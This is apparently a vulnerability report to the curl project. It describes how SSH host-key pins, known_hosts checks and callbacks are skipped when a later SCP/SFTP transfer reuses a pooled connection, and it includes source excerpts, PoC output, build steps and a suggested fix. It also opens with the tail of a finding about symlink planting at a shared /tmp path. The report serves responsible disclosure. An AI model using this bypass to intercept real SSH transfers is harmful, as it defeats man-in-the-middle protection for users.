4. **Exposure in shared environments.** CI and build scripts commonly use fixed paths such as `/tmp/cookies.txt`. Any local user can plant the link in advance.

title: SSH (SCP/SFTP) host-key verification is skipped on connection reuse — a pinned/known_hosts transfer silently reuses a previously-unverified connection
weakness: Improper Validation of Certificate with Host Mismatch
body:
## Summary

For SCP/SFTP, curl verifies the server's host key once, during the initial connect state machine,
in `ssh_check_fingerprint()` — which reads `CURLOPT_SSH_HOST_PUBLIC_KEY_SHA256` / `_MD5`, the
`CURLOPT_SSH_KNOWNHOSTS` file, and the `CURLOPT_SSH_HOSTKEYFUNCTION` callback. That function has
exactly one caller, `ssh_state_hostkey()` (`lib/vssh/libssh2.c:1461`), reached only on a fresh
connect.

The SSH connection-reuse gate, `ssh_config_matches()`, compares only the client identity key files:

```c
/* lib/url.c:569-578 */
static bool ssh_config_matches(struct connectdata *one,
                               struct connectdata *two)
{
  struct ssh_conn *sshc1, *sshc2;
  sshc1 = Curl_conn_meta_get(one, CURL_META_SSH_CONN);
  sshc2 = Curl_conn_meta_get(two, CURL_META_SSH_CONN);
  return sshc1 && sshc2 && Curl_safecmp(sshc1->priv_key, sshc2->priv_key) &&
         Curl_safecmp(sshc1->pub_key, sshc2->pub_key);
}
```

None of the host-key verification inputs are part of this comparison (`git grep` for
`SSH_HOST_PUBLIC_KEY_SHA256|_MD5|SSH_KNOWNHOSTS|ssh_hostkeyfunc` in `lib/url.c` returns 0 hits; the
only `ssh_auth_types` hit at `url.c:375` is default initialization, not a reuse comparison).

Finally, the reuse/attach operation performs no re-verification — it only re-points libssh2's
abstract pointer at the new easy handle:

```c
/* lib/vssh/libssh2.c:3910-3922 */
static void ssh_attach(struct Curl_easy *data, struct connectdata *conn)
{
  ...
    if(sshc && sshc->ssh_session) {
      void **abstract = libssh2_session_abstract(sshc->ssh_session);
      *abstract = data;   /* no ssh_check_fingerprint() here */
    }
}
```

## Root cause

Host-key verification policy is treated as a connect-time action, not as part of the connection's
security identity. Because the verification inputs are absent from `ssh_config_matches()` and
`ssh_attach()` does not re-check, a connection established under one host-key policy can be handed to
a later transfer that requested a stricter policy, and the stricter check never runs.

## Attacker model / reachability

Two SCP/SFTP transfers in one process over a shared connection pool (one easy handle reused, a multi
handle, or `CURLSH` with `CURL_LOCK_DATA_CONNECT`), to the same host/port/user with the same identity
key files, where:
- transfer #1 uses weak or no host-key verification (no known_hosts, no pin) — with no known_hosts
  configured, libssh2 accepts the presented host key (`lib/vssh/libssh2.c:319-322`); and
- transfer #2 configures a host-key pin (`CURLOPT_SSH_HOST_PUBLIC_KEY_SHA256`), a `known_hosts`
  file, or a host-key callback.

`ssh_config_matches()` returns TRUE (identity key files match), so transfer #2 reuses transfer #1's
connection and `ssh_check_fingerprint()` is never called for it. If a man-in-the-middle substituted
the server during transfer #1 (accepted because #1 did not verify), transfer #2 — which demanded a
pin precisely to detect that — proceeds on the attacker-controlled connection. The host-key pin /
known_hosts / callback is silently bypassed.

## Live PoC (confirmed end-to-end)

Confirmed against curl built from this commit with the libssh2 backend (libssh2 1.11.2_DEV, built
from source) talking to a paramiko SFTP server with a fixed host key. `attachments/ssh_client.c`
performs two SFTP GETs on **one** easy handle (shared pool): transfer #1 with no host-key
verification; transfer #2 with a deliberately **wrong** `CURLOPT_SSH_HOST_PUBLIC_KEY_SHA256` pin.
`attachments/poc_ssh_hostkey.py` drives it and compares the reuse case against a `CURLOPT_FRESH_CONNECT`
control. Captured output (`attachments/ssh_hostkey_transcript.txt`):

```
################ EXPLOIT (fresh2=0): #2 reuses #1's pooled SFTP connection ################
[client] transfer 1  pin=(none)   fresh=0 -> rc=0 (No error)
[client] transfer 2  pin=AAAA...= fresh=0 -> rc=0 (No error)
  RESULT rc1=0 rc2=0
  >>> wrong host-key pin was NOT enforced on the reused connection

################ CONTROL (fresh2=1): #2 forced onto a FRESH connection ################
[client] transfer 1  pin=(none)   fresh=0 -> rc=0 (No error)
[client] transfer 2  pin=AAAA...= fresh=1 -> rc=60 (SSH remote key was not OK)
  RESULT rc1=0 rc2=60
  >>> on a fresh connection the wrong pin IS enforced
```

The exact same wrong SHA256 pin that correctly fails verification on a fresh connection (rc=60,
`CURLE_PEER_FAILED_VERIFICATION`) is silently accepted when transfer #2 reuses transfer #1's
connection (rc=0). That is the host-key verification bypass, demonstrated directly.

## Reproduce

```
# build libssh2 (from source) and curl --with-libssh2, then:
gcc -I include attachments/ssh_client.c lib/.libs/libcurl.a \
    -L<libssh2-prefix>/lib -lssh2 -lssl -lcrypto -lbrotlidec -lbrotlicommon -lz -o ssh_client
pip install paramiko
python3 -I attachments/poc_ssh_hostkey.py   # edit SCRATCH path at top if needed
```

The pure-source verifier (`attachments/verify.sh` / `verify-output.txt`) remains included: it shows
the single fingerprint-check call site, the fields compared for reuse, and the no-op attach path.

## Suggested fix

Add the host-key verification inputs to the SSH reuse comparison — `STRING_SSH_HOST_PUBLIC_KEY_SHA256`,
`STRING_SSH_HOST_PUBLIC_KEY_MD5`, `STRING_SSH_KNOWNHOSTS`, and the presence/identity of
`ssh_hostkeyfunc` — in `ssh_config_matches()` (mirroring how `priv_key`/`pub_key` were added for
CVE-2022-27782), or re-run `ssh_check_fingerprint()` on reuse in `ssh_attach()`. A connection must
not be reused by a transfer whose host-key policy is stricter than the one the connection was
established under.

## Impact

## Impact

A transfer that explicitly requests SSH host-key verification — a SHA256/MD5 host-key pin, a
`known_hosts` file, or a host-key callback — can have that verification silently skipped when it
reuses a pooled SCP/SFTP connection that was established by an earlier transfer under a weaker (or
absent) host-key policy. Host-key verification is curl's defence against a man-in-the-middle on an
SSH transfer; bypassing it on reuse defeats MITM detection for the transfer that asked for it.

Realistic shape: a process does an initial unverified SCP/SFTP operation (or one whose host-key was
accepted with no known_hosts), then a second operation to the same host/user with a pin configured.
The second operation inherits the first connection without re-checking the host key, so an attacker
who was able to MITM the first (unverified) connection is not caught by the second transfer's pin.

## What it is / is not

- It **is** a host-key verification bypass on connection reuse — the SSH analogue of the TLS reuse
  tightening in CVE-2022-27782, whose SSH portion only added the identity key-file comparison and
  omitted the host-key verification inputs.
- It **is** confirmed live end-to-end: a wrong host-key pin that rejects on a fresh connection
  (rc=60) is silently accepted on a reused connection (rc=0). Code trace, live PoC, and both
  controls are in `attachments/`.
- It is **not** memory-unsafe.

## Honest severity

Medium, matching the parent CVE-2022-27782. The effect is a security-control bypass (host-key
verification / MITM detection), not merely a behavioural inconsistency, which is why I rate it above
the other reuse-key gaps. It is now demonstrated at runtime, not only from the source.
